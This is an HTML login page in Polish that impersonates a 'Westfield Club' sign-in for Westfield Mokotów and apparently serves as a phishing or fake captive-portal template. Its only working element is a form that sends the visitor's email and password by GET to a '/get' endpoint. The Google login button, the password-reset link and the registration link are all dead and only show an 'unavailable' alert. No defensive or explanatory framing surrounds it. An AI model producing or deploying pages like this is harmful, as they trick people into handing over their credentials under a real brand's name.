<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Westfield Mokotów – Logowanie</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #f5f5f5, #e0e0e0);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 180px;
      margin-bottom: 1.5rem;
    }

    h1 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #c20017;
    }

    .google-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fff;
      border: 1px solid #ccc;
      border-radius: 6px;
      padding: 0.75rem;
      cursor: pointer;
      transition: background 0.3s;
      font-size: 1rem;
      font-weight: 500;
      color: #444;
      width: 100%;
      margin-bottom: 1rem;
      text-decoration: none;
    }

    .google-btn:hover {
      background: #f0f0f0;
    }

    .google-icon {
      width: 20px;
      height: 20px;
      margin-right: 0.5rem;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    input {
      padding: 0.75rem;
      border: 1px solid #c20017;
      border-radius: 6px;
      font-size: 1rem;
    }

    button[type="submit"] {
      background: #c20017;
      color: #fff;
      border: none;
      padding: 0.75rem;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s;
    }

    button[type="submit"]:hover {
      background: #a10014;
    }

    .footer {
      margin-top: 1.5rem;
      font-size: 0.85rem;
      color: #888;
    }

    .footer a {
      color: #c20017;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .alert {
      background: #ffe0e0;
      color: #a10014;
      padding: 0.75rem;
      border-radius: 6px;
      margin-bottom: 1rem;
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Zaloguj się do Westfield Club</h1>

    <div id="alertBox" class="alert">Ta funkcja jest chwilowo niedostępna.</div>

    <div class="google-btn" onclick="showAlert()">
      Zaloguj się przez Google
    </div>

    <form action="/get" id="login-form">
      <input name="email" type="email" placeholder="Adres e-mail" required />
      <input name="password" type="password" placeholder="Hasło" required />
      <button type="submit">Zaloguj się</button>
    </form>

    <div class="footer" onclick="showAlert()">
      <p><a href="#">Nie pamiętasz hasła?</a> | <a href="#">Zarejestruj się</a></p>
    </div>
  </div>

  <script>
    function showAlert() {
      const alertBox = document.getElementById("alertBox");
      alertBox.style.display = "block";
      setTimeout(() => {
        alertBox.style.display = "none";
      }, 4000);
    }
  </script>

</body>
</html>
